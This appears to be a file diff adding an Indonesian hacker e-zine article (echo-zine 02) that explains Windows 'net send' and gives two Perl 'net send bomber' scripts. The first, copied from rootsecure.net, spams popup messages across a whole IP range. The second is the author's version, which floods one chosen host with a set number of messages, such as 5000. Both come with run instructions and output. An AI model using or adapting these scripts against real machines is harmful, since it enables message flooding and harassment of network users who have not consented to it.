@@ -1,0 +1,293 @@
+#-====-====--=-=-=-=-=-=-=-=-=Netsendz bomber=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=--=-=]
+
+echo-zine 02
+Oleh: y3dips (echo-staff)
+      y3dips@echo.or.id || y3dips@plasa.com
+
+	#!/usr/bin/perl -w
+	#!C:\Perl\bin\perl.exe -w
+	################################################################
+
+	################################################################
+	#                                                              #
+	# By using this code you agree to indemnify rootsecure.net     #
+	# from any liability that might arise from its use.            #
+	#                                                              #
+	# Also you agree not to use it for the purpose of advertising  #
+	# any product, brand or service.                               #
+	#                                                              #
+	################################################################
+
+	$message_text = "spam";
+	$first_x2_ip = "127.0";
+	
+
+	for ($countb=0; $countb<257; $countb++) {
+
+    		for ($counta=1; $counta<257; $counta++) {
+        	$send_message_to = "$first_x2_ip.$countb.$counta";
+        	&mess_send;
+    		}
+
+	}
+
+	sub mess_send {
+   	system("net send $send_message_to = $message_text");
+   	print "$send_message_to\n";
+
+	}
+	
+	*POtongan Kode diatas aku dapatkan dari www.rootsecure.com,
+
+	Pertanyaan yang timbul adalah apa yang  terjadi  kalo  exploits tersebut 
+	dijalankan?  atau parahnya lagi bagaimana sih ngejalaninnya?(jangan malu
+	dengan pertanyaan  seperti ini,	karena semua  orang  juga awalnya "bego"
+	a.k.a "gak tau!",yang haruskamu lakuin adalah bedakan kamu dengan'mereka'
+	, gimana? Cari tau, caranya? Belajar! belajar1 belajar!&& bertanya ?
+
+	*Buat apa sih kode diatas?
+	kode di  atas  adalah sepotongan  program  kecil  yang  digunakan  untuk 
+	"mengeksploitasi" << thats why its call exploits, 
+
+	*apa pula itu exploits?
+	disini kita akan melompati pertanyaan ini, bukan karena aku "gak tau " :P
+	tapi kalau kayak gini  kapan  kita  masuk  ke  inti  permasalahnya.. oke!
+	terlalu   banyak   sumber yang    membahas  pengertian  exploits . ...oke
+	"jangan selalu berharap mendapatkan ikan, tapi carilah kail sendiri dan 
+	memancinglah"
+
+	biar mudah aku berikan kail dan umpannya:)
+	
+	[dari The Jargon File (version 4.4.4)] 
+	exploit: n. 
+	[originally cracker slang] 
+
+	1. A vulnerability in software that can be used for breaking  security or 
+	   otherwise attacking an Internet host over the network. The Ping O'Death
+	   is a famous exploit. 
+   	2. More grammatically, a  program  that exploits an exploit in sense 1.
+
+	itu salah satu umpan yang aku kasih; pancingnya www.g**gle.com [:P]
+
+	*Net SenD ?
+	Baiklah, terlalu banyak waktu kita buang, sekarang apa pula itu net  send
+	NEt send adalah salah satu fasiltas pada MICr.Wind*ws agar satu pc dan pc 
+        lain yang terkoneksi dengan JAringan dapat saling berkirim pesan (pop up 
+        message)
+
+	Ingat fasilitas ini hanya terdapat pada Mic.Wind*ws dengan versi OS 2K, XP
+	NT, dan keatasnya, sementara buat WIn95, 98<<tidak ! ,jangan tanya mengapa?
+	karena itu bukanlah hal yang pantas anda tanyakan,bedakan lagi anda dengan 
+	'mereka', jangan tanyakan haLHAL bodoh, atau setidaknya'tanyakan ke OraNG 
+	yang tepat!.
+
+	*bagaimana memakainya [NEt send off course!]
+	masuk ke command prompt>
+	Start>Run>command>
+	Microsoft(R) Windows DOS
+	(C) Copyright Microsoft Corp 1990-2001
+
+	C:\DOCUME~1\Y3DIPS>
+
+	Cat: aku coba ini pada microsoft windows XP
+	ketik net send
+	
+	C:\DOCUME~1\Y3DIPS>net send
+	The syntax of this command is:
+	
+	NET SEND
+	<name | * | /DOMAIN[:name] | /USER> message
+	
+	mari kita lakukan..
+	C:\NET SEND 127.0.0.1 hallo 
+	(127.0.0.1, ip tujuan, karena aku lakukan  dg standalone jadi aku pake 
+	loopback address)
+
+	apabila berhasil akan tampak pada:
+	pc target (127.0.0.1): sebuah pop up message box berisi
+	
+	 -------------------------------------------------------------
+	 | Messenger service					   X |
+	 -------------------------------------------------------------
+	 | Message from Y3DIPSPC to 127.0.0.1 on 11/4/2003 7:05:55 PM|
+	 | hallo	          ____                               |
+	 |			  |ok|				     |
+	 |                        ----				     |
+	 -------------------------------------------------------------
+
+       
+        pada pc pengirim
+	The message was successfully sent to 127.0.0.1.
+
+	ENough for ?NEt SEnd!
+
+	*Sekarang kita bahas Exploitsnya:
+	Apa yang di perlukan, sebuah compiler untuk mengeksekusi exploits tsb,
+	yang pasti adalah, kita butuh compiler untuk perl,   kenapa?  karena 
+	program tersebut ditulis dengan bahasa pemrogaman perl , perl? << baca
+	di www.perl.com, oke!
+	jadi apa yang kita butuhkan? 
+	1. compiler buat perl
+	2. Dapat diapaki di winD*s OPS..
+		alternatifnya adalah  : Active perl , yang dapat di download di 
+		www.CPAN.org
+	extract ke c:\, sehingga akan terapat folder baru dengan nama Perl!
+
+	*SUDAH PUAS? sudaH JELas!
+	sekarang mari kita compile source tersebut: letakkan file tersebut di 
+	C:\ direktori sehingga mudah, kemudian lakukan:
+	1. edit   $message_text = "spam"; dan 
+	          $first_x2_ip = "192.168"; < ip awal yang anda ingin kirim
+	   dengan yang anda inginkan..
+	   misal $message_text= "hallo_sayang" dan
+	   	 $first_x2_ip="127.0"kemudian;
+		
+	
+	C:\ perl netsnd.pl
+	127.0.0.1
+	The message was successfully sent to 127.0.0.18.... s/d..
+
+	127.0.0.255
+	The message was successfully sent to 127.0.0.19.....s/d
+
+	127.0.1.0
+	The message was successfully sent to 127.0.0.114. ....s/d
+
+	127.0.1.255
+	The message was successfully sent to 127.0.0.115.dan sampai ke
+
+	127.0.255.255
+	The message was successfully sent to 127.0.0.116.
+
+	dia akan menyebar broadcast sebanyak 255x255, artinya membanjiri
+	trafik jaringan.. :P
+	hal ini dibuktikan dengan potongan kode berikut ini:
+
+	for ($countb=0; $countb<257; $countb++) {
+
+    		for ($counta=1; $counta<257; $counta++) {
+        	$send_message_to = "$first_x2_ip.$countb.$counta";
+        	&mess_send;
+    		}
+
+	}
+	.........(yang aku masih bingung kenapa di potongan ini sampai 257?)
+	terserahlah? :)
+
+	*sekarang pembahasan program selesai, puas! cuma gini doang! :(
+	gak kok, sekarang aku telah memodifikasinya, :) kenapa  repot-  repot 
+	pake modifikasi segala, banyak yang bilang begitu, wong  tinggal  pake 
+	aja! (perkataan kayak gini yang sering banget aku denger, dan sering
+	membuat mental temen-temen jadi jatuh dan males belajar  pemrograman
+	= terus terang aku bisa ngerti pemrograman bukan dari baca 	buku, 
+	bukan dari belajar ngetikin syntax satu -satu, tapi agak licik sedikit
+	aku liat programorang, aku perhatikan,aku sesuaikan dengan keinginanku
+	pola pikirku, n setidaknya itu bekerja padaku :P. di + yg lain juga)
+	*yang paling aku kesel, kenapa orang berfikir kita hanya ubah printf
+	ini dan itu.. padahal "kita juga ngertilah, mosok cuma numpang ganti 
+	printf dan banner doang, ini lebih bego dan percuma"
+
+	*ok!kebanyakan intronya..
+	ini potongan kode yang aku buat, akan kita bandingkan bedanya;
+
+	--------------------------------code mulai disini-------------------
+	# netsnd.pl
+	#!/usr/bin/perl -w
+
+	printf"\n*****************************************************\n";
+      	print "  *                                                   *\n";
+      	print "  *            Netsendbomberz buat windows            *\n";
+     	print "  *        based on net_send_ips:rootsecure.net       *\n";
+     	print "  *  created && tested by y3dips on XP Operating Sys  *\n";
+      	print "  *   greetz to echostaff a.k.a the_day, moby, comex  *\n";
+      	print "  *     echo-memberz, newbie_hacker, puji_tiwili*     *\n";
+      	print "  *                                                   *\n";
+      	printf"  *****************************************************\n\n";
+ 
+	if(@ARGV == 3)
+    	{
+      
+      		$pesan = $ARGV[0];
+      		$ip    = $ARGV[1];
+      		$jumlah= $ARGV[2];
+
+
+	for ($awal=0; $awal<$jumlah; $awal++) {
+        	$mengirimke = "$ip"; &kirim;  }
+
+	#aku hanya pinjam prosedur ini, karena ini yang mengilhami aku ; :)
+
+	sub kirim 					
+	{ system("net send $mengirimke = $pesan");}
+    	}
+
+	else{
+      	print "   [Gunakan] .. perl $0 [tulis_pesan][host][jumlahx]  \n";
+	}  
+	
+	-------------------------------------potong disini------------------------
+	untuk banner  :) aku juga malu ngungkapinnya , but mau gimana lagi 
+	"i just can say thanks to them" << lewatkan bagian ini.. , kamu bisa 
+	ganti juga, or bahkan gak dimasukkan, terserah..
+	Mau ngapain sih?
+	aku cuma ingin mengirim pesan ke 1  buah pc  dalam jumlah yang sangat
+	banyak	bukan seperti diatas[gak fokus],aku cuma mo ngirim 5000 pesan 
+        ke 192.168.1.0
+	"clear by know?" << oke!!
+
+	*apa yang aku lakukan;
+	aku menambahkan 3 buah inputan;
+	dengan menggunakan perintah ARGV, aku memberikan 3 buah inputan yaitu:
+	1. $pesan = < pesan kamu
+	2. $ip = <ip sasaran
+	3. $jumlah= <banyaknya pesan yang dikirim
+	
+	terus lakukan perintah looping
+	for ($awal=0; $awal<$jumlah; $awal++) {
+        	$mengirimke = "$ip"; &kirim;  }
+	yang akan masuk ke sub kirim >> & kirim
+
+	dan aku juga tambahkan contoh, jika anda gak tau harus ngapain?....
+	kalo ngetik perl netsnd.pl doangan..
+	bakal muncul
+	[Gunakan] .. perl netsnd.pl [tulis_pesan][host][jumlahx]
+	so kamu bisa pakai;
+	c:\perl netsnd.pl hallo_sayang 192.168.0.1 5000
+	selanjutnya yang terjadi seperti diatas,bedanya pada pc target muncul
+	5000 buah message box.. :)
+	
+	
+	#ITS DONE my man..
+
+	Now its time for you to write your own code..
+
+	*RemIND me IF i....
+	-apakah saya menjiplak? hanya ganti banner :P ? anda putuskan?
+	-apakah anda hanya maujadi pemakai?,karena berbagai omongan yang gak
+	 jelas! atau cobalah tulis kode sendiri dengan algoritma sendiri dan 
+	 kebutuhan sendiri meskipun  anda  masih  menggunakan potongan kecil 
+	 kode orang lain"tapi itulah open source, buat apa melakukan dua hal
+	 yang berulang tapi kembangkanlah dan ciptakan cirimu sendiri"
+
+	-akhirnya kalo banyak salah,saya minta maaf, saya juga belajar.kritik 
+	 dan saran dapat ditujukan ke y3dips[at]echo.or.id.
+
+	sumber code :rootsecure.net
+	meminjam beberapa istilah dari JArgon FIlE
+	greetz to: [ echostaff a.k.a moby, the_day, comex, ] puji_tiwili* 
+		   anak anak newbie_hacker     para pencinta *pen source,
+		   #indohack [scut]. onno w.purbo, linus, esr, [RMS] ...	
+
+
+	*dan kudengar  mereka berbisik" carilah  jalanmu sendiri  walau  kau 
+	terpaksa menginjak-injak pundakku " <long life for open source">
+
+=-=-=-=-=-=-=-=-=-=-=--=--=-=-=-=-=-=--=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==--=-=-=-]
+	             
+
+	
+	
+
+	
+
+	
